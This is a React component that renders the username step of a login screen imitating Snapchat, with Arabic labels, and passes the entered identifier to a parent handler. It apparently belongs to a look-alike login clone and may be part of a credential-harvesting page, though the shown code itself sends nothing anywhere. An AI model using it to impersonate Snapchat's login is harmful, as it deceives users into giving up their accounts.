import { useState } from 'react';

interface LoginUsernameProps {
  onNext: (identifier: string) => void;
  onSwitchToPhone: () => void;
}

const inputStyle: React.CSSProperties = {
  width: '100%',
  padding: '0.75rem 1rem',
  border: '2px solid #e5e7eb',
  borderRadius: '0.5rem',
  fontSize: '1rem',
  transition: 'border-color 0.2s',
};

export default function LoginUsername({ onNext, onSwitchToPhone }: LoginUsernameProps) {
  const [identifier, setIdentifier] = useState('');
  const [inputBorder, setInputBorder] = useState('#e5e7eb');

  const handleNext = () => {
    if (identifier.trim()) {
      onNext(identifier);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  return (
    <div className="snapchat-container">
      <div className="snapchat-card">
        <h1 className="snapchat-title">تسجيل الدخول إلى سناب شات</h1>
        
        <div className="mb-6">
          <label className="snapchat-subtitle">اسم المستخدم أو البريد الإلكتروني</label>
          <input
            type="text"
            style={{ ...inputStyle, borderColor: inputBorder }}
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            onKeyPress={handleKeyPress}
            onFocus={() => setInputBorder('#3b82f6')}
            onBlur={() => setInputBorder('#e5e7eb')}
            placeholder=""
          />
        </div>

        <div className="text-center mb-6">
          <button
            onClick={onSwitchToPhone}
            className="snapchat-link"
          >
            استخدم رقم الهاتف بدلاً من ذلك
          </button>
        </div>

        <button
          onClick={handleNext}
          className="snapchat-button w-full"
          disabled={!identifier.trim()}
        >
          التالي
        </button>

        <div className="snapchat-footer-link">
          هل أنت جديد في سناب شات؟{' '}
          <a href="https://www.snapchat.com/signup" target="_blank" rel="noopener noreferrer">
            تسجيل الاشتراك
          </a>
        </div>
      </div>
    </div>
  );
}
